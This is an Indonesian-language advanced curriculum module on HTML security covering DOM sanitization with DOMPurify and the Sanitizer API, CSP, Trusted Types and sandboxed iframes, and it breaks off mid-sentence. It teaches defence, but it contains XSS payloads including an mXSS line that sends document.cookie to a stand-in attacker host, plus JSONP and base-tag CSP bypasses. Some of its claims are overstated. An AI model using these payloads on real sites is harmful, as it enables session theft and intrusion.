# Bab 09 Module 01: Keamanan HTML: Sanitasi DOM, CSP, dan Isolasi Sandbox

---

## SEKSI 01 — IDENTITAS MODUL
* **Track:** 03-Frontend-and-Mobile
* **Topik:** Keamanan HTML: Sanitasi DOM, CSP, dan Isolasi Sandbox
* **Level:** Advanced (Staff Engineer Core Curriculum)
* **Prasyarat:** Pemahaman mendalam tentang HTML Living Standard, DOM Tree Lifecycle, JavaScript V8/SpiderMonkey Execution Contexts, HTTP Protocols (RFC 9110), dan Browser Security Model (Same-Origin Policy).

---

## SEKSI 02 — LEARNING OBJECTIVES
Setelah menyelesaikan modul ini, peserta mampu:
1. Mengonstruksi arsitektur pertahanan berbasis *defense-in-depth* pada layer presentasi HTML untuk mengeliminasi kerentanan Cross-Site Scripting (Reflected, Stored, dan DOM-based XSS).
2. Menganalisis dan memitigasi serangan *mutation-based* XSS (mXSS) dan *DOM Clobbering* melalui manipulasi parsing tree browser.
3. Mengimplementasikan sanitasi input berkinerja tinggi menggunakan DOMPurify dan W3C Sanitizer API native.
4. Merancang, menerapkan, dan memvalidasi Content Security Policy (CSP) Level 3 yang ketat menggunakan *nonce-based* dan *hash-based* directives tanpa merusak interoperabilitas aplikasi.
5. Mengisolasi konten tidak tepercaya (*untrusted content*) menggunakan `<iframe>` sandbox flag matrix dan COOP/COEP/CORP boundaries.

---

## SEKSI 03 — MINDSET & MENTAL MODEL
Dokumen HTML bukanlah sekadar teks statis; ia adalah sekumpulan instruksi kompilasi untuk mesin parsing browser (*HTML parser*) yang memproduksi struktur pohon memori (*Document Object Model*). 

```
Mental Model: "Untrusted String is Executable Code Until Proven Inert"
```

Sebagian besar kerentanan keamanan frontend lahir dari ilusi bahwa string HTML hanyalah data visual. Begitu sebuah string disuntikkan ke dalam *sink* DOM berbahaya (seperti `innerHTML`, `outerHTML`, atau `document.write`), browser mengeksekusinya layaknya kode program. Parser HTML memiliki algoritma pemulihan kesalahan (*error-recovery*) yang sangat toleran, yang secara aktif mengeksploitasi celah interpretasi antara sanitizer berbasis Regex dan struktur parsing internal browser.

Untuk mengamankan antarmuka web, Anda harus mengadopsi model mental **Kompilasi Berlapis Berpagar (Gated Multi-stage Compilation)**:
1. **Inert Phase:** Input dianggap byte biner radioaktif. Tidak ada evaluasi parsing kontekstual.
2. **Contextual Encoding & Sanitation:** Transformasi struktur node melalui parser inert (misal: `DOMParser` / Sanitizer API) untuk membuang atribut dan tag berisiko tinggi sebelum pohon node digabungkan ke live DOM.
3. **Execution Containment:** Mengasumsikan sanitasi bisa bocor; oleh karena itu, runtime JavaScript diikat secara ketat oleh Content Security Policy (CSP) dan batasan isolasi proses OS-level browser (Sandbox, Process-per-Site).

---

## SEKSI 04 — ARSITEKTUR & DIAGRAM ALUR

Berikut adalah alur eksekusi komprehensif saat untrusted data masuk dari API hingga dirender ke dalam Live DOM, melibatkan Content Security Policy Engine, Sanitizer, dan Iframe Isolation:

```
[Untrusted Payload from API/User]
             │
             ▼
   [HTML Sanitizer Gate]
             │
   ┌─────────┴──────────────────────────────────────┐
   │ Check: Native Sanitizer API / DOMPurify        │
   │ 1. Parse into Inert DOM DocumentFragment       │
   │ 2. Namespace validation (HTML/SVG/MathML)      │
   │ 3. Check against Allowlist/Denylist Elements   │
   │ 4. Attribute Scan & Protocol Check (http/https)│
   │ 5. Mutation XSS (mXSS) Hardening               │
   └─────────┬──────────────────────────────────────┘
             │
             ▼
      [Sanitized Fragment]
             │
             ├─────────────────────────────────────────────────┐
             │                                                 │
   [Target: Main Live DOM]                        [Target: Sandboxed <iframe>]
             │                                                 │
             ▼                                                 ▼
   [Trusted Types Policy Check]                   [Sandbox Boundary Check]
   Is payload of type `TrustedHTML`?              Matrix: allow-scripts,
   ├── NO  ──> [DOMException: Type Mismatch]              allow-same-origin, etc.
   └── YES ──> Continue Injection                              │
             │                                                 │
             ▼                                                 ▼
   [Write to Live DOM Node]                       [Isolated Render Process]
   (e.g., node.appendChild(fragment))             - Unique Opaque Origin
             │                                    - Restricted Storage/Cookies
             ▼                                                 │
   [Browser HTML/DOM Parser]                                   │
             │                                                 │
             ▼                                                 ▼
   [Content Security Policy Engine] <──────────────────────────┘
   Directive Checks:
   - script-src 'nonce-...' / 'strict-dynamic'
   - object-src 'none'
   - base-uri 'none'
             │
   ┌─────────┴───────────────────────┐
   │ Script violation detected?      │
   ├─────────────────────────────────┤
   │ YES ──> Block Execution         │
   │         Send CSP-Report to URI  │
   │                                 │
   │ NO  ──> Execute & Paint Frame   │
   └─────────────────────────────────┘
```

---

## SEKSI 05 — ANATOMI & MEKANISME INTERNAL

### 1. The HTML Parser Tokenization & Tree Construction
Browser memproses HTML melalui dua tahap: **Tokenisasi** dan **Konstruksi Pohon (Tree Construction)**. State machine parser HTML berpindah berdasarkan karakter yang ditemui. Masalah keamanan terbesar muncul saat parsing berpindah konteks:
- *Data State* -> Berpindah ke *Tag Open State* saat menemukan `<`.
- *RAWTEXT / RCDATA State* -> Masuk saat tag `<script>`, `<style>`, `<textarea>`, atau `<title>` dibaca.
- *Foreign Content State* -> Terjadi saat tag SVG (`<svg>`) atau MathML (`<math>`) diparsing.

Dalam Foreign Content, aturan parsing HTML standar dilewati; tag XML-case-sensitive diproses, dan parser memperlakukan penutupan tag secara berbeda. Penyerang memanfaatkan ketidaksesuaian ini untuk memicu **Mutation XSS (mXSS)**: elemen yang tampaknya aman saat dibaca oleh parser inert (`DOMParser`) bermutasi menjadi vektor eksekusi berbahaya saat diserialisasi ulang dan disuntikkan ke live DOM karena browser menulis ulang parsing tree sesuai spesifikasi integrasi HTML/SVG.

### 2. DOM Clobbering
DOM Clobbering terjadi ketika elemen HTML yang memiliki atribut `id` atau `name` (misalnya `<form id="config">` atau `<a id="admin" href="...">`) menimpa variabel global pada objek `window` atau properti dari node DOM (`document.config`).
Browser secara historis mengasosiasikan ID elemen bernama dengan properti window (`window[id]`). Jika kode aplikasi Anda melakukan pengecekan seperti:
```javascript
let clientConfig = window.clientConfig || fetchDefaultConfig();
```
Penyerang dapat menyuntikkan:
```html
<a id="clientConfig" href="javascript:alert(1)"></a>
```
Variabel `window.clientConfig` kini merujuk pada `HTMLAnchorElement`, memotong logika downstream aplikasi dan membuka pintu eksekusi script tak terduga saat properti anchor tersebut dibaca.

### 3. Content Security Policy (CSP) Internals
CSP dioperasikan pada level C++ dalam engine browser (Blink/WebKit/Gecko) sebelum interpreter JavaScript diizinkan mengeksekusi bytecode:
- **Header vs Meta Tag:** CSP paling optimal dikirim via HTTP Header. `<meta http-equiv="Content-Security-Policy">` memiliki limitasi: tidak mendukung direktif `frame-ancestors`, `report-uri`, atau `sandbox`.
- **Nonce Life-cycle:** Nonce (number used once) harus berupa nilai acak kriptografis (minimal 128-bit base64) yang dibuat *per-request* oleh server web. Browser membandingkan atribut `nonce` pada tag `<script>` dengan nilai nonce di HTTP response header CSP. Jika cocok, script dieksekusi; jika tidak cocok, V8 Context mengeksekusi blocking event dan membangkitkan `SecurityPolicyViolationEvent`.

---

## SEKSI 06 — DEEP DIVE KONSEP & TEORI TEKNIS

### Sanitasi: Regular Expression vs Inert DOM vs Native Sanitizer
Upaya membersihkan HTML menggunakan Regular Expression (Regex) terbukti **cacat secara matematis**. HTML adalah tata bahasa bebas konteks (*context-free grammar*) yang rekursif, yang tidak dapat dipetakan secara deterministik oleh bahasa reguler (*regular language*).

```
Regex-based Sanitizer  ──>  Rapuh terhadap nested tags, obfuscation, polymorphic SVG/MathML
Inert DOM (DOMPurify)   ──>  Parsing virtual via createHTMLDocument, sanitasi node-by-node, serialisasi balik
Native Sanitizer API   ──>  Sanitasi in-engine (C++), nol overhead serialisasi, kebal mXSS
```

#### W3C Sanitizer API (Modern Standard)
API bawaan modern browser memutus mata rantai manipulasi string. Alih-alih:
`element.innerHTML = sanitize(untrustedInput);` (yang masih melibatkan parsing string berisiko),
Sanitizer API memperkenalkan metode native:
```javascript
const sanitizer = new Sanitizer({
  allowElements: ['b', 'i', 'em', 'strong', 'a'],
  allowAttributes: {'href': ['a']}
});
element.setHTML(untrustedInput, { sanitizer });
```
Data diparsing langsung di level internal engine browser dan hanya elemen yang diizinkan yang ditransfer ke live node tree tanpa melalui serialisasi string perantara yang rentan.

### Sandbox Iframe: Prinsip Least Privilege
Tag `<iframe>` secara default mengeksekusi konten dalam origin yang sama jika URL-nya berasal dari origin yang sama, atau cross-origin jika dari host berbeda. Atribut `sandbox` mengubah iframe menjadi mode terkunci secara ekstrem:
- `sandbox=""` (nilai kosong): Menerapkan SEMUA batasan:
  - Konten diperlakukan dari origin unik (*opaque origin* `null`), memblokir akses ke `localStorage`, `document.cookie`, dan Same-Origin DOM traversal.
  - Eksekusi script dinonaktifkan secara total.
  - Form submission dinonaktifkan.
  - Popups, orientasi layar, pointer lock, dan auto-play dinonaktifkan.

Kombinasi paling berbahaya adalah:
```html
<!-- ANTIPATTERN FATAL -->
<iframe sandbox="allow-scripts allow-same-origin" src="..."></iframe>
```
Jika kedua token ini diaktifkan secara simultan, script di dalam iframe dapat memanipulasi atribut sandbox pada iframe itu sendiri atau menggunakan kredensial origin induk untuk memotong isolasi keamanan sepenuhnya.

---

## SEKSI 07 — CONTOH KODE FUNDAMENTAL

Berikut implementasi dasar sanitasi DOMPurify dengan konfigurasi aman, penanganan CSP dasar via meta tag (untuk development lokal), dan integrasi Trusted Types.

```html
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <!-- CSP Fundamental untuk pengujian lokal: Blokir script inline tanpa nonce, tolak eval -->
  <meta http-equiv="Content-Security-Policy" 
        content="default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; object-src 'none';">
  <title>Fundamental DOM Sanitization & Sandbox</title>
  <!-- Library sanitasi industri DOMPurify -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.8/purify.min.js"></script>
</head>
<body>
  <h1>Pusat Uji Sanitasi DOM & Iframe Sandbox</h1>
  
  <div id="untrusted-preview-container">
    <h3>Live Container</h3>
    <div id="safe-output"></div>
  </div>

  <div id="sandbox-wrapper">
    <h3>Sandboxed Iframe Container</h3>
    <!-- Iframe terisolasi ketat: Script diizinkan tetapi origin dipaksa null (no allow-same-origin) -->
    <iframe id="isolated-frame" sandbox="allow-scripts" style="width: 100%; height: 200px; border: 1px solid red;"></iframe>
  </div>

  <script>
    // 1. Untrusted string yang berisi berbagai payload eksploitasi
    const untrustedPayload = `
      <div>
        <p>Halo, ini pesan pengguna yang valid.</p>
        <img src="invalid-image" onerror="alert('Exploited via inline onerror!')" />
        <a href="javascript:alert('Exploited via javascript pseudo-protocol!')">Klik Disini</a>
        <form id="testForm"><input id="attributes" name="attributes"></form>
        <svg><script>alert('Exploited via SVG context!')<\/script></svg>
      </div>
    `;

    // 2. Konfigurasi DOMPurify secara aman
    const sanitizeConfig = {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'div'],
      ALLOWED_ATTR: ['href', 'title', 'target'],
      ALLOW_DATA_ATTR: false,
      // Blokir skema berbahaya
      ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto|tel|callto):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
      // Mematikan mXSS vectors
      RETURN_DOM_FRAGMENT: true,
      FORCE_BODY: false
    };

    // 3. Eksekusi Sanitasi
    const cleanFragment = DOMPurify.sanitize(untrustedPayload, sanitizeConfig);

    // 4. Injeksi aman menggunakan DocumentFragment (mencegah evaluasi innerHTML string ulang)
    const targetElement = document.getElementById('safe-output');
    targetElement.replaceChildren(cleanFragment);

    // 5. Menangani payload di dalam Sandboxed Frame
    const sandboxedFrame = document.getElementById('isolated-frame');
    // Karena sandbox="allow-scripts" aktif TANPA allow-same-origin, 
    // script di dalamnya berjalan dengan Origin `null`, tidak dapat mengakses dokumen induk.
    const iframeContent = `
      <!DOCTYPE html>
      <html>
      <body>
        <h4>Konten di dalam Iframe Terisolasi</h4>
        <script>
          try {
            // Mencoba membaca cookie parent
            const secret = window.parent.document.cookie;
            document.write('Berhasil bypass: ' + secret);
          } catch(e) {
            document.write('<p style="color: green;">ISOLASI BERHASIL: Gagal mengakses parent document (' + e.message + ')</p>');
          }
        <\/script>
      </body>
      </html>
    `;
    sandboxedFrame.srcdoc = iframeContent;
  </script>
</body>
</html>
```

---

## SEKSI 08 — ANALISIS BARIS DEMI BARIS

Berikut adalah analisis arsitektural dari implementasi kode di Seksi 07:

1. **Baris 6–7 (`<meta http-equiv="Content-Security-Policy" ...>`):**
   - Mendefinisikan baseline boundary.
   - `default-src 'self'`: Semua asset (style, gambar, fetch) default hanya boleh diambil dari origin yang sama.
   - `script-src 'self' https://cdnjs.cloudflare.com`: Membatasi eksekusi file script hanya dari origin internal dan CDN cdnjs yang terverifikasi.
   - `object-src 'none'`: Mematikan runtime plugin warisan seperti Flash, Java, atau objek `<embed>`/`<applet>` yang sering menjadi vektor eksploitasi memory corruption.

2. **Baris 20 (`<iframe id="isolated-frame" sandbox="allow-scripts" ...>`):**
   - Menetapkan atribut `sandbox="allow-scripts"`.
   - Perhatikan tidak adanya flag `allow-same-origin`. Hal ini memaksa iframe berjalan di bawah *unique/opaque origin*. Iframe dapat mengeksekusi logika komputasi JS, tetapi seluruh panggilan Web Storage (`localStorage`, `sessionStorage`), HTTP cookie, dan `window.parent` DOM access akan memicu `SecurityError`.

3. **Baris 26–34 (`const untrustedPayload = ...`):**
   - Mensimulasikan polymorph payload. Tag `<img onerror=...>` mengeksploitasi atribut event handler. Tag `<a href="javascript:...">` mengeksploitasi URI execution schemes. Tag `<form id="testForm">` berupaya memicu *DOM Clobbering*. Tag `<svg><script>` berupaya mengelabui parser HTML standar melalui *Foreign Content Context*.

4. **Baris 37–46 (`const sanitizeConfig = ...`):**
   - Membangun strict allowlist (`ALLOWED_TAGS` dan `ALLOWED_ATTR`). Pola denylist (memblokir `<script>` saja) selalu gagal karena variasi eksploitasi mencapai ribuan tag dan atribut global.
   - `RETURN_DOM_FRAGMENT: true`: DOMPurify tidak mengembalikan string yang diserialisasi, melainkan objek `DocumentFragment` asli di memori. Ini adalah mitigasi absolut terhadap mXSS parser round-trip bug.

5. **Baris 53 (`targetElement.replaceChildren(cleanFragment);`):**
   - Menggunakan API DOM modern `replaceChildren()` alih-alih `innerHTML = ...`. Penggunaan `replaceChildren` menerima node/fragment langsung, menjamin tidak ada parser string yang dievaluasi ulang oleh engine C++ browser.

6. **Baris 65–72 (`try { const secret = window.parent.document.cookie; ... }`):**
   - Pengujian batas isolasi sandbox. Saat engine JavaScript mengeksekusi instruksi ini dari iframe ber-origin `null`, browser melempar exception:
     `DOMException: Blocked a frame with origin "null" from accessing a cross-origin frame.`

---

## SEKSI 09 — STUDI KASUS NYATA
**Skenario:** Aplikasi Enterprise Knowledge Base & Financial Ticketing (PT FinTech Guard Nusantara).

**Insiden:**
Aplikasi mengizinkan analis tiket keuangan menulis catatan internal dalam format Rich Text (Markdown/HTML) untuk mendokumentasikan anomali transaksi. Sistem menggunakan pipeline sanitasi backend berbasis library regex kustom dan langsung menampilkan hasilnya di frontend melalui manipulasi DOM `div.innerHTML = response.notes`.

Penyerang (seorang insider dengan akses analis tingkat rendah) menyuntikkan payload Mutation XSS bersarang yang memanfaatkan integrasi tag SVG dan MathML:
```html
<math><mtext><table><mglyph><style><!--</style><img src="/" onerror="fetch('https://attacker.internal/exfil?c='+document.cookie)">
```

**Dampak Serangan:**
Sanitizer regex backend gagal mengenali tag `<style>` di dalam context MathML/SVG karena menganggap komentar `<!--` menutup tag secara aman. Namun, saat dirender di Chromium browser live DOM, parser menginterpretasikan ulang pohon node: tag `<style>` tidak menutup `<mglyph>`, komentar terabaikan, dan atribut `onerror` dari tag `<img>` dieksekusi di context DOM pengguna level Admin. Akibatnya:
- Session Token admin dicuri via request HTTP.
- Terjadi eskalasi hak akses (*Horizontal & Vertical Privilege Escalation*).
- Integritas sistem audit keuangan terkompromikan.

**Solusi Arsitektural:**
Migrasi pipeline ke model sanitasi deterministik:
1. Penolakan total parsing backend HTML mentah; transformasi murni Markdown ke HTML dilakukan di sandbox terisolasi.
2. Penerapan **Trusted Types API** pada Chromium engine untuk mematikan penggunaan raw string pada sink DOM (`innerHTML`).
3. Menerapkan **Content Security Policy Level 3** ketat menggunakan `nonce` kriptografis dan pemblokiran total `unsafe-inline`.
4. Rendering konten tiket wajib diisolasi ke dalam `<iframe>` beratribut sandbox tanpa hak akses credential induk.

---

## SEKSI 10 — IMPLEMENTASI KASUS NYATA & HANDS-ON PRODUCTION CODE

Berikut adalah implementasi end-to-end skala enterprise yang mengintegrasikan Trusted Types, sanitasi DOMPurify berlapis, dan render engine terisolasi.

```javascript
/**
 * Production-Grade Secure Renderer Service
 * Enterprise Architecture: PT FinTech Guard Nusantara
 */

// 1. Inisialisasi Trusted Types Policy Enforcement
let securityPolicy = null;

if (window.trustedTypes && window.trustedTypes.createPolicy) {
  try {
    securityPolicy = window.trustedTypes.createPolicy('enterprise-security-policy', {
      createHTML: (rawInput) => {
        // Melarang string kosong atau non-string bypass
        if (typeof rawInput !== 'string') {
          throw new TypeError('[SECURITY] Input must be a valid string.');
        }

        // Sanitasi mendalam menggunakan DOMPurify
        const sanitizedFragment = DOMPurify.sanitize(rawInput, {
          ALLOWED_TAGS: [
            'h1', 'h2', 'h3', 'h4', 'p', 'b', 'strong', 'i', 'em', 
            'ul', 'ol', 'li', 'code', 'pre', 'blockquote', 'table', 
            'thead', 'tbody', 'tr', 'th', 'td'
          ],
          ALLOWED_ATTR: ['class'], // Hanya izinkan class css yang terverifikasi
          FORBID_TAGS: ['style', 'script', 'iframe', 'object', 'embed', 'svg', 'math'],
          FORBID_ATTR: ['style', 'onerror', 'onload', 'onclick', 'onmouseover'],
          USE_PROFILES: { html: true }, // Nonaktifkan SVG/MathML profile sepenuhnya
          RETURN_DOM_FRAGMENT: false // TrustedHTML memerlukan return type string
        });

        return sanitizedFragment;
      },
      createScriptURL: (url) => {
        // Hanya izinkan script URL dari domain CDN internal
        const parsedUrl = new URL(url, window.location.origin);
        if (parsedUrl.origin !== 'https://cdn.fintechguard.id') {
          throw new SecurityError(`[CSP VIOLATION] Script origin disallowed: ${parsedUrl.origin}`);
        }
        return parsedUrl.href;
      }
    });
  } catch (err) {
    console.error('[SECURITY ERROR] Trusted Types policy registration failed:', err);
  }
}

/**
 * Komponen Renderer Aman untuk Konten Markdown/HTML
 */
class SecureContentRenderer {
  constructor(containerElement) {
    if (!(containerElement instanceof HTMLElement)) {
      throw new Error('[INIT ERROR] Valid container DOM element required.');
    }
    this.container = containerElement;
  }

  /**
   * Menampilkan Konten di Live DOM menggunakan Trusted Types
   */
  renderDirectToDOM(untrustedHTML) {
    try {
      this.container.replaceChildren(); // Kosongkan node terdahulu secara aman

      if (securityPolicy) {
        // Menghasilkan instance TrustedHTML terverifikasi
        const trustedHTML = securityPolicy.createHTML(untrustedHTML);
        // Menggunakan insertAdjacentHTML atau innerHTML yang sekarang terlindungi policy
        this.container.innerHTML = trustedHTML;
      } else {
        // Fallback untuk browser non-Chromium (Safari/Firefox legacy)
        const sanitizedFragment = DOMPurify.sanitize(untrustedHTML, {
          RETURN_DOM_FRAGMENT: true,
          USE_PROFILES: { html: true }
        });
        this.container.appendChild(sanitizedFragment);
      }
    } catch (err) {
      this._handleSecurityFailure('Direct DOM Injection Failed', err);
    }
  }

  /**
   * Menampilkan Konten di Sandboxed Iframe (Double Isolation Engine)
   */
  renderInSandbox(untrustedHTML) {
    this.container.replaceChildren();

    const iframe = document.createElement('iframe');
    
    // Sandbox ketat: Tidak ada allow-same-origin, script dimatikan total
    // Konten hanya boleh menampilkan teks dan struktur statis
    iframe.setAttribute('sandbox', '');
    iframe.setAttribute('referrerpolicy', 'no-referrer');
    iframe.style.width = '100%';
    iframe.style.height = '400px';
    iframe.style.border = '1px solid #e2e8f0';
    iframe.style.borderRadius = '8px';

    // Injeksi dengan CSP level micro-frame
    const secureIframePayload = `
      <!DOCTYPE html>
      <html>
      <head>
        <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline';">
        <style>
          body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 16px; color: #1e293b; }
          table { width: 100%; border-collapse: collapse; }
          th, td { border: 1px solid #cbd5e1; padding: 8px; text-align: left; }
        </style>
      </head>
      <body>
        <div id="content"></div>
        <script>
          // Script ini akan langsung diblokir CSP dan Sandbox jika mencoba berjalan
        <\/script>
      </body>
      </html>
    `;

    iframe.srcdoc = secureIframePayload;

    iframe.onload = () => {
      try {
        // Karena opaque origin (sandbox=""), akses direct dokumen diizinkan 
        // hanya saat inisialisasi awal melalui srcdoc pada beberapa engine,
        // namun metode teraman adalah menaruh konten sebelum dirender:
        const processedDoc = iframe.srcdoc.replace(
          '<div id="content"></div>',
          `<div id="content">${securityPolicy ? securityPolicy.createHTML(untrustedHTML) : DOMPurify.sanitize(untrustedHTML)}</div>`
        );
        iframe.srcdoc = processedDoc;
      } catch (e) {
        this._handleSecurityFailure('Iframe Sandbox Injection Failed', e);
      }
    };

    this.container.appendChild(iframe);
  }

  _handleSecurityFailure(context, error) {
    console.error(`[SECURITY INCIDENT] Context: ${context}`, error);
    this.container.textContent = 'Gagal menampilkan konten karena pelanggaran kebijakan keamanan data.';
    
    // Kirim telemetri ke SIEM (Security Information and Event Management)
    if (navigator.sendBeacon) {
      const logData = JSON.stringify({
        timestamp: new Date().toISOString(),
        violation: context,
        details: error.message,
        url: window.location.href
      });
      navigator.sendBeacon('/api/v1/security/telemetry-sink', logData);
    }
  }
}
```

---

## SEKSI 11 — TRADE-OFFS & ANALISIS PERBANDINGAN KOMPARATIF

| Fitur / Dimensi | Direct Insertion (`innerHTML`) | DOMPurify Sanitization | Native Sanitizer API (W3C) | Sandboxed Iframe (`srcdoc`) |
| :--- | :--- | :--- | :--- | :--- |
| **Keamanan Default** | **Zero Security** (Raw XSS Vector) | Tinggi (Dikelola komunitas & riset) | Sangat Tinggi (Hardware/C++ Level) | Absolut (Isolasi boundary OS/Proses) |
| **Overhead Kinerja** | Tercepat (Tanpa parsing layer tambahan) | Sedang (Membutuhkan parsing memori sekunder) | Rendah (Parsing langsung di layout engine) | Paling Lambat (Spawn sub-frame rendering tree) |
| **Alokasi Memori** | Minimum | Menggandakan overhead memory string/DOM | Efisien (In-place transformation) | Tinggi (Mengalokasikan browsing context baru) |
| **Dukungan Browser** | Semua Browser | Semua Browser (Polyfill/Universal) | Terbatas (Chromium Base Modern) | Semua Browser Modern |
| **Kekebalan mXSS** | Rentan total | Sangat kebal (Jika dikonfigurasi tepat) | Kebal Mutlak secara desain | Kebal (Eksploitasi terisolasi di context opaque) |
| **Interoperabilitas UI** | Mulus | Mulus | Mulus | Sulit (Layout resizing, isolasi CSS/Font) |

---

## SEKSI 12 — EDGE CASES & PITFALLS

### 1. SVG Use Tag Poisoning via Cross-Origin References
Penyerang dapat memanfaatkan elemen `<svg><use href="evil.svg#payload"></use></svg>`. Meskipun tag `<script>` dibersihkan, referensi eksternal SVG dapat memicu request cross-origin yang tidak diinginkan dan dalam beberapa kasus mengeksekusi payload animasi SMIL (`<animate>`/`<set>` attributes) yang memanipulasi attribute script.
*Mitigasi:* Nonaktifkan tag `<use>`, `<svg>`, dan `<math>` secara global kecuali benar-benar diperlukan untuk charting grafis.

### 2. Bypass CSP Melalui JSONP Endpoint
Jika Content Security Policy menyertakan origin CDN besar pada direktif `script-src`:
`script-src 'self' https://cdnjs.cloudflare.com https://accounts.google.com;`
Penyerang tidak perlu menyuntikkan script inline. Mereka menyuntikkan tag:
`<script src="https://accounts.google.com/o/oauth2/revoke?callback=maliciousFunction"></script>`
Endpoint JSONP mengeksekusi callback JavaScript arbitrary yang valid di bawah origin aplikasi Anda.
*Mitigasi:* Terapkan arsitektur **Strict CSP (Nonce-based CSP)** dan gunakan direktif `'strict-dynamic'`. Hapus semua allowlist domain eksternal.

### 3. Base Tag Hijacking
Jika CSP mengabaikan direktif `base-uri`, penyerang dapat menyuntikkan:
```html
<base href="https://attacker.site/">
```
Semua script relatif downstream (`<script src="/js/app.js">`) akan dimuat langsung dari server milik penyerang (`https://attacker.site/js/app.js`), melumpuhkan integritas seluruh aplikasi.
*Mitigasi:* Tetapkan direktif `base-uri 'none'` atau `base-uri 'self'` secara absolut di header HTTP.

---

## SEKSI 13 — COMMON MISTAKES & CARA MENGHINDARINYA

### 1. Menggunakan Regex untuk Menghapus `<script>`
*Salah:*
```javascript
// FATAL FLAW: Jangan pernah lakukan ini!
function naiveSanitize(str) {
  return str.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, "");
}
```
*Mengapa Fatal:* Polimorfisme parser HTML mengabaikan regex ini dengan mudah. Contoh bypass:
- `<img src="x" onerror="alert(1)">` (Tidak mengandung kata script sama sekali).
- `<scr<script>ipt>alert(1)</script>` (Saat replace menghapus tag tengah, string luar menyatu menjadi `<script>`).
- `<svg/onload=alert(1)>` (Parser SVG menangani tag tanpa spasi).
*Solusi:* Gunakan parser berbasis AST (Abstract Syntax Tree) atau library sanitizer berbasis DOM yang diverifikasi industri (DOMPurify).

### 2. Mengabaikan Trusted Types Enforcement
*Salah:* Mengandalkan *developer discipline* untuk selalu mengingat pemanggilan `DOMPurify.sanitize()` di setiap baris kode codebase yang berisi jutaan baris kode.
*Solusi:* Aktifkan HTTP Header:
`Content-Security-Policy: require-trusted-types-for 'script';`
Begitu header ini aktif, browser akan mematikan semua penetapan langsung bertipe string ke sink DOM:
```javascript
// Engine akan langsung melempar RUNTIME EXCEPTION secara otomatis:
element.innerHTML = "<div>Test</div>"; 
// TypeError: Failed to set the 'innerHTML' property on 'Element': This document requires 'TrustedHTML' assignment.
```

---

## SEKSI 14 — BEST PRACTICES & KONVENSI INDUSTRI

1. **Header-Enforced CSP Level 3:** Jangan mengandalkan tag `<meta>` untuk konfigurasi keamanan utama. Kirimkan header melalui reverse proxy (Nginx/Cloudflare) atau application server gateway:
   ```http
   Content-Security-Policy: default-src 'none'; script-src 'nonce-rAnd0m12345' 'strict-dynamic'; style-src 'self' 'nonce-rAnd0m12345'; img-src 'self' data:; connect-src 'self' https://api.enterprise.domain; frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'self'; require-trusted-types-for 'script';
   ```
2. **Dynamic Nonce Generation:** Buat nonce berbasis CSP menggunakan generator pseudo-random kriptografis CSPRNG (minimal 128-bit entropy, di-encode base64) unik di setiap transmisi HTTP request.
3. **Double Encoding Elimination:** Jangan menerapkan sanitasi sebelum data disimpan ke database. Simpan data dalam bentuk aslinya (raw), dan lakukan sanitasi *tepat saat data akan dirender* ke format presentasi konteks tertentu (HTML, Text, atau JSON).
4. **Isolasi Cross-Origin Process:** Tambahkan header isolasi Spectre/Meltdown:
   ```http
   Cross-Origin-Opener-Policy: same-origin
   Cross-Origin-Embedder-Policy: require-corp
   Cross-Origin-Resource-Policy: same-origin
   ```

---

## SEKSI 15 — OPTIMASI KINERJA & EFISIENSI MEMORI/JARINGAN

Operasi sanitasi DOM dan rendering sandboxed iframe memiliki dampak signifikan terhadap *Frame Rate* (FPS) dan alokasi memori heap.

```
+-----------------------------------------------------------------------------------------+
|                              PERFORMANCE OPTIMIZATION LIFECYCLE                         |
|                                                                                         |
|  [Incoming Rich Text] ──> [Memoization Hash] ──> Cache Hit? ──YES──> [Re-use Safe DOM]  |
|                                     │                                                   |
|                                     NO                                                  |
|                                     ▼                                                   |
|                         [Offscreen / Web Worker]                                        |
|                       (String AST Processing only)                                      |
|                                     │                                                   |
|                                     ▼                                                   |
|                      [DocumentFragment Construction]                                    |
|                                     │                                                   |
|                                     ▼                                                   |
|                      [requestIdleCallback Dispatch] ──> Inject into Live Tree           |
+-----------------------------------------------------------------------------------------+
```

1. **Memoization Layer:** Rich Text data yang statis (seperti dokumentasi help-center atau thread komentar lama) memiliki output parsing deterministik. Implementasikan hash-based WeakMap cache:
   ```javascript
   const sanitationCache = new Map();

   function getSanitizedHTML(untrustedKey, untrustedRaw) {
     if (sanitationCache.has(untrustedKey)) {
       return sanitationCache.get(untrustedKey);
     }
     const clean = DOMPurify.sanitize(untrustedRaw);
     sanitationCache.set(untrustedKey, clean);
     return clean;
   }
   ```
2. **Iframe Pool Recycling:** Membuat dan menghancurkan `<iframe>` sandbox secara terus-menerus memicu siklus *Garbage Collection* yang intens dan pembuatan context browser baru yang lambat (hingga ~100ms per instantiation). Gunakan pola